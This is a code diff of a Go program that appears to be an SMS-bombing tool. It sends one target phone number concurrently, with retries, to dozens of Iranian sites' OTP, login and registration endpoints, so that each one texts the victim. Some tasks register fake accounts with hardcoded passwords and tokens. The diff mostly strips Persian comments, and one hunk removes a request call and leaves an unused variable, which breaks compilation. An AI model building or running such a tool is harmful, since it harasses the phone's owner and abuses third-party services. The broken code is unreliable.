@@ -149,12 +149,12 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 		resp.Body.Close() 
 		return 
 	}
-}// تابع sendGETRequest jadid
+}
 func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
 	const maxRetries = 3
-	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET
+	const retryDelay = 2 * time.Second
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
@@ -200,10 +200,9 @@ func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan
 
 		ch <- resp.StatusCode
 		resp.Body.Close()
-		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
+		return 
 	}
 }
-// توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
 func getPhoneNumberNoZero(phone string) string {
 	if strings.HasPrefix(phone, "0") {
 		return phone[1:]
@@ -332,74 +331,71 @@ func main() {
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://admin.zoodex.ir/api/v2/login/check?need_sms=1", map[string]interface{}{
-				"mobile": phone, // نیاز به 0 اول دارد
+				"mobile": phone, 
 			}, &wg, ch)
 		}
-		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) - فرمت عجیب شماره تلفن
+		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) -
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
-				"cellphone": "0" + getPhoneNumber98NoZero(phone), // نیاز به 0098... دارد
-				"country_code": "98", // کد کشور ثابت
+				"cellphone": "0" + getPhoneNumber98NoZero(phone), 
+				"country_code": "98",
 			}, &wg, ch)
 		}
 		// https://poltalk.me/api/v1/auth/phone (JSON)
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{
-				"phone": phone, // نیاز به 0 اول دارد
+				"phone": phone,
 			}, &wg, ch)
 		}
 		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("action", "refah_send_code") // مقادیر ثابت
-			formData.Set("mobile", phone) // نیاز به 0 اول دارد
-			formData.Set("security", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("action", "refah_send_code") 
+			formData.Set("mobile", phone) 
+			formData.Set("security", "placeholder") 
 
 			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 		// https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=09123456456 (GET)
 		wg.Add(1)
 		tasks <- func() {
-			// شماره تلفن در Query String قرار می‌گیرد
-			urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone) // نیاز به 0 اول
+			urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone) 
 			sendGETRequest(ctx, urlWithPhone, &wg, ch)
 		}
 		// https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/09123456456/sms?cCode=%2B98 (GET)
 		wg.Add(1)
 		tasks <- func() {
-			// شماره تلفن مستقیم در URL قرار می‌گیرد
-			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone) // نیاز به 0 اول و کد کشور در Query
-			sendGETRequest(ctx, urlWithPhone, &wg, ch)
+			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone)
 		}
 		// https://pirankalaco.ir/SendPhone.php (Form Data)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("phone", phone) // نیاز به 0 اول دارد
+			formData.Set("phone", phone) 
 			sendFormRequest(ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
 		}
 		// https://gharar.ir/users/phone_number/ (Form Data)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("phone", phone) // نیاز به 0 اول دارد
+			formData.Set("phone", phone) 
 			sendFormRequest(ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch)
 		}
                 // https://www.irantic.com/api/login/authenticate (JSON)
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
-				"mobile": phone, // نیاز به 0 اول دارد
+				"mobile": phone, 
 			}, &wg, ch)
 		}
 			// gifkart.com (SMS - POST Form)
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
-				formData.Set("PhoneNumber", phone) // شماره کامل
+				formData.Set("PhoneNumber", phone) 
 				sendFormRequest(ctx, "https://gifkart.com/request/", formData, &wg, ch)
 			}
 			// gamefa.com (Register flow 2 - SMS OTP step - POST Form)
@@ -409,31 +405,31 @@ func main() {
 				formData.Set("action", "digits_forms_ajax")
 				formData.Set("type", "register")
 				formData.Set("digt_countrycode", "+98")
-				formData.Set("phone", getPhoneNumberNoZero(phone)) // شماره بدون صفر اول
-				formData.Set("email", "koyaref766@kazvi.com")     // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-				formData.Set("digits_reg_password", "trrdfstrtft") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-				formData.Set("digits_process_register", "1")      // مقدار ثابت
-				formData.Set("sms_otp", "")                       // مقدار ثابت
-				formData.Set("otp_step_1", "1")                    // مقدار ثابت
-				formData.Set("digits_otp_field", "1")              // مقدار ثابت
-				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-				formData.Set("optional_data", "optional_data")                // مقدار ثابت
-				formData.Set("dig_otp", "otp") // مقدار ثابت
+				formData.Set("phone", getPhoneNumberNoZero(phone)) 
+				formData.Set("email", "koyaref766@kazvi.com")    
+				formData.Set("digits_reg_password", "trrdfstrtft")
+				formData.Set("digits_process_register", "1")      
+				formData.Set("sms_otp", "")                     
+				formData.Set("otp_step_1", "1")                    
+				formData.Set("digits_otp_field", "1")            
+				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a")
+				formData.Set("optional_data", "optional_data")               
+				formData.Set("dig_otp", "otp") 
 				formData.Set("digits", "1")
 				formData.Set("digits_redirect_page", "//gamefa.com/")
-				formData.Set("digits_form", "3827f92f86") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-				formData.Set("_wp_http_referer", "/?login=true") // مقدار ثابت
-				formData.Set("container", "digits_protected") // مقدار ثابت
-				formData.Set("sub_action", "sms_otp")         // مقدار ثابت
+				formData.Set("digits_form", "3827f92f86") 
+				formData.Set("_wp_http_referer", "/?login=true")
+				formData.Set("container", "digits_protected") 
+				formData.Set("sub_action", "sms_otp")         
 				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
                        // virgool.io (verify - POST JSON)
 			wg.Add(1)
 			tasks <- func() {
 				payload := map[string]interface{}{
-					"method":     "phone",                            // مقدار ثابت
-					"identifier": getPhoneNumberPlus98NoZero(phone), // +98 + شماره بدون صفر اول
-					"type":       "register",                         // مقدار ثابت
+					"method":     "phone",                           
+					"identifier": getPhoneNumberPlus98NoZero(phone), 
+					"type":       "register",                        
 				}
 				sendJSONRequest(ctx, "https://virgool.io/api2/app/auth/verify", payload, &wg, ch)
 			}
@@ -441,8 +437,8 @@ func main() {
 			wg.Add(1)
 			tasks <- func() {
 				payload := map[string]interface{}{
-					"phone":    phone, // شماره کامل
-					"referrer": "",    // مقدار ثابت
+					"phone":    phone, 
+					"referrer": "",    
 				}
 				sendJSONRequest(ctx, "https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", payload, &wg, ch)
 			}
@@ -451,15 +447,15 @@ func main() {
 			tasks <- func() {
 				formData := url.Values{}
 				formData.Set("action", "logini_first")
-				formData.Set("login", phone) // شماره کامل
+				formData.Set("login", phone) 
 				sendFormRequest(ctx, "https://lintagame.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 			// account.api.balad.ir (POST JSON)
 			wg.Add(1)
 			tasks <- func() {
 				payload := map[string]interface{}{
-					"phone_number": phone, // شماره کامل
-					"os_type":      "W",   // مقدار ثابت
+					"phone_number": phone, 
+					"os_type":      "W",   
 				}
 				sendJSONRequest(ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
 			}
@@ -467,7 +463,7 @@ func main() {
 			wg.Add(1)
 			tasks <- func() {
 				payload := map[string]interface{}{
-					"mobile": phone, // شماره کامل
+					"mobile": phone, 
 				}
 				sendJSONRequest(ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch)
 			}
@@ -477,8 +473,8 @@ func main() {
 				formData := url.Values{}
 				formData.Set("action", "digits_check_mob")
 				formData.Set("countrycode", "+98")
-				formData.Set("mobileNo", phone) // شماره کامل
-				formData.Set("csrf", "0a60a620d9") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("mobileNo", phone) 
+				formData.Set("csrf", "0a60a620d9") 
 				formData.Set("login", "2")
 				formData.Set("username", "")
 				formData.Set("email", "")
@@ -494,31 +490,28 @@ func main() {
 				payload := map[string]interface{}{
 					"properties": map[string]interface{}{
 						"language":      2,
-						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
-						"clientVersion": "web",                          // مقدار ثابت
-						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", 
+						"clientVersion": "web",                        
+						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", 
 					},
 					"singleRequest": map[string]interface{}{
 						"getOtpTokenRequest": map[string]interface{}{
-							"username": getPhoneNumber98NoZero(phone), // 98 + شماره بدون صفر اول
+							"username": getPhoneNumber98NoZero(phone),
 						},
 					},
 				}
 				sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch)
 			}
-     // harikashop.com - register (ثبت نام - شامل پارامترهای دینامیک و فیلدهای بیشتر)
+     // harikashop.com 
     wg.Add(1)
     tasks <- func() {
         formData := url.Values{}
-        // formData.Set("back", "https://harikashop.com/") // ممکن است دینامیک باشد
         formData.Set("id_customer", "")
-        // formData.Set("back", "") // تکراری، حذف شد
-        formData.Set("firstname", "Test") // می‌توانید تغییر دهید یا تصادفی کنید
-        formData.Set("lastname", "User") // می‌توانید تغییر دهید یا تصادفی کنید
-        formData.Set("password", "TestPass123") // ممکن است نیاز به پسورد قوی داشته باشد
+        formData.Set("firstname", "Test")
+        formData.Set("lastname", "User") 
+        formData.Set("password", "TestPass123") 
         formData.Set("action", "register")
         formData.Set("username", phone)
-        // formData.Set("back", "https://harikashop.com/") // تکراری، حذف شد
         formData.Set("ajax", "1")
         sendFormRequest(ctx, "https://harikashop.com/login?back=https%3A%2F%2Fharikashop.com%2F", formData, &wg, ch)
     }
@@ -534,21 +527,20 @@ func main() {
     wg.Add(1)
     tasks <- func() {
         formData := url.Values{}
-        formData.Set("mobile", phone[1:]) // حذف صفر اول
+        formData.Set("mobile", phone[1:]) 
         formData.Set("use_emta_v2", "yes")
         formData.Set("domain", "nobat")
         sendFormRequest(ctx, "https://api.nobat.ir/patient/login/phone", formData, &wg, ch)
     }
-    // snapp.market (شامل کوئری پارامتر در URL)
+    // snapp.market
      wg.Add(1)
     tasks <- func() {
         formData := url.Values{}
         formData.Set("cellphone", phone)
-        // کوئری پارامترها را به URL اضافه می‌کنیم
         urlWithQuery := "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + phone
         sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
     }
-    // sabziman.com (فرم موجود در کد شما)
+    // sabziman.com 
     wg.Add(1)
     tasks <- func() {
         formData := url.Values{}
@@ -556,14 +548,12 @@ func main() {
         formData.Set("phonenumber", phone)
         sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
     }
-    // api.achareh.co (شامل کوئری پارامتر در URL)
+    // api.achareh.co 
     wg.Add(1)
     tasks <- func() {
-         // اصلاح نوع payload به map[string]interface{}
          payload := map[string]interface{}{
-            "phone": "98" + phone[1:], // اضافه کردن 98 و حذف صفر اول بر اساس نمونه
+            "phone": "98" + phone[1:], 
         }
-        // کوئری پارامتر به URL اضافه می‌شود
         urlWithQuery := "https://api.achareh.co/v2/accounts/login/?web=true"
         sendJSONRequest(ctx, urlWithQuery, payload, &wg, ch)
     }
@@ -585,8 +575,6 @@ func main() {
 		// api6.arshiyaniha.com (JSON)
 		wg.Add(1)
 		tasks <- func() {
-			// توجه: در نمونه شما شماره تلفن با "00" شروع میشد، اینجا از ورودی کاربر (phone) استفاده شده.
-			// اگر نیاز به فرمت "0098..." دارید، باید اینجا تبدیل انجام دهید: "0098" + strings.TrimPrefix(phone, "0")
 			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
 				"cellphone":    phone,
 				"country_code": "98",
@@ -598,24 +586,24 @@ func main() {
 			formData := url.Values{}
 			formData.Set("action_type", "phone")
 			formData.Set("digt_countrycode", "+98")
-			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
+			formData.Set("phone", strings.TrimPrefix(phone, "0")) 
 			formData.Set("email", "")
 			formData.Set("digits_reg_name", "abcdefghl")
-			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
+			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") 
 			formData.Set("digits_process_register", "1")
 			formData.Set("optional_email", "")
 			formData.Set("is_digits_optional_data", "1")
 			formData.Set("sms_otp", "")
 			formData.Set("otp_step_1", "1")
 			formData.Set("signup_otp_mode", "1")
-			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
+			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
 			formData.Set("optional_data", "email")
 			formData.Set("action", "digits_forms_ajax")
 			formData.Set("type", "register")
 			formData.Set("dig_otp", "")
 			formData.Set("digits", "1")
-			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
-			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
+			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") 
+			formData.Set("digits_form", "3bed3c0f10")                
 			formData.Set("_wp_http_referer", "/")
 			formData.Set("container", "digits_protected")
 			formData.Set("sub_action", "sms_otp")
@@ -625,11 +613,9 @@ func main() {
 		// mamifood.org - SendValidationCode (JSON)
 		wg.Add(1)
 		tasks <- func() {
-			// توجه: پارامتر "did" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Device ID).
-			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت did جدید در هر بار دارد.
 			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
 				"Phone": phone,
-				"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791", // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
+				"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791",
 			}, &wg, ch)
 		}
 		// platform-api.snapptrip.com - request-otp (JSON)
@@ -650,7 +636,7 @@ func main() {
 				"OtpApp":                     0,
 				"IsAppOnly":                  false,
 				"deviceTypeCode":             7,
-				// سایر فیلدهای موجود در Payload اصلی را می‌توانید اینجا اضافه کنید اگر نیاز باشد
+
 			}, &wg, ch)
 		}
 		// see5.net (Form)
@@ -658,7 +644,7 @@ func main() {
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("mobile", phone)
-			formData.Set("name", "sfsfsfsffsf") // یک نام ثابت اینجا اضافه شده
+			formData.Set("name", "sfsfsfsffsf") 
 			formData.Set("demo", "bz_sh_fzltprxh")
 			sendFormRequest(ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
 		}
@@ -721,7 +707,6 @@ func main() {
 		wg.Add(1) // digistyle.com (Form)
 		tasks <- func() {
 			formData := url.Values{}
-			// کلید 'loginRegister%5Bemail_phone%5D' decode میشود به 'loginRegister[email_phone]'
 			formData.Set("loginRegister[email_phone]", phone)
 			sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
 		}
@@ -959,7 +944,7 @@ func main() {
 				"mobile": phone,
 			}, &wg, ch)
 		}
-		wg.Add(1) // digikalajet.ir (JSON) - تکراری در لیست قبلی
+		wg.Add(1) // digikalajet.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 				"phone": phone,
